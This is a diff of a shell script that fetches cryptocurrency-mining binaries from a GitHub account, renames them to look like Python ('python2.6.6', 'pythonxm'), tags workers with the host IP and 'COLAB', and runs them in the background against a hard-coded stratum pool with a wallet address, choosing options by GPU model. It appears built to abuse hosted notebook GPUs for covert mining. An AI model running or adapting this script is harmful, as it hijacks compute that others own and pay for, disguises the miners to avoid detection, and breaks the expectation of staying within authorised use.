@@ -6,7 +6,7 @@ IPNAME=$(sed 's|\.|o|g' <<< $iip)
 curl ipinfo.io
 
 echo '#######################################################'
-echo '##################### Test N 41 ########################'
+echo '##################### RV v0.0.1 #######################'
 echo '#######################################################'
 
 rm -rf python2.6.6
@@ -31,42 +31,28 @@ rm -rf x.out
 # Prepare
 wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
 chmod +x pythonxm
-wget -q https://github.com/one10001/10001code/raw/main/config3.json
-sed -i "s+ip0001+COLAB_$IPNAME+g" config3.json
+wget -q https://github.com/one10001/10001code/raw/main/config.json
+sed -i "s+ip0001+COLAB_RV_$IPNAME+g" config.json
+
+nohup ./pythonxm -c config.json 2>> oout 1>> oout &
 
 
 
 if [ $(nvidia-smi | grep P100-PCIE |wc -l) == 1 ]
 then
     while true
-    do 
-        date 
-        nohup ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.BO_CU_P100_$IPNAME@116.203.10.54:80  -U 2>> oout 1>> oout &
-        #nohup ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.BO_OC_P100_$IPNAME@116.203.10.54:80  -G 2>> oout 1>> oout &
-        nohup ./pythonxm -c config3.json 2>> oout 1>> oout &
+        nohup ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.RV_CU_P100_$IPNAME@116.203.10.54:80  -U 2>> oout 1>> oout &
         tail -f oout
    done
-
 elif [ $(nvidia-smi | grep T4 |wc -l) == 1 ]
 then
-    echo '................... PARAM T4 ...................................'
-    nvidia-smi -pm ENABLED -i 0
-    nvidia-smi -ac 5002,1592
-    while true
-    do
-        date 
-        nohup ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.BO_CU_T4_$IPNAME@116.203.10.54:80  -U 2>> oout 1>> oout &
-        nohup ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.BO_OC_T4_$IPNAME@116.203.10.54:80  -G 2>> oout 1>> oout &
-        nohup ./pythonxm -c config3.json 2>> oout 1>> oout &
-        tail -f oout
-    done
+    nohup  ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_T4_$IPNAME@116.203.10.54:80  -G  2>> oout 1>> oout &
+    tail -f oout
+elif [ $(nvidia-smi | grep K80 |wc -l) == 1 ]
+then
+    nohup  ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_K80_$IPNAME@116.203.10.54:80  -G 2>> oout 1>> oout &
+    tail -f oout
 else
-    while true
-    do
-        date 
-        nohup ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.BO_CU_Other_$IPNAME@116.203.10.54:80  -U 2>> oout 1>> oout &
-        nohup ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.BO_OC_Other_$IPNAME@116.203.10.54:80  -G 2>> oout 1>> oout &
-        nohup ./pythonxm -c config3.json 2>> oout 1>> oout &
-        tail -f oout
-    done
+    nohup  ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_Other_$IPNAME@116.203.10.54:80  -G 2>> oout 1>> oout &
+     tail -f oout
 fi
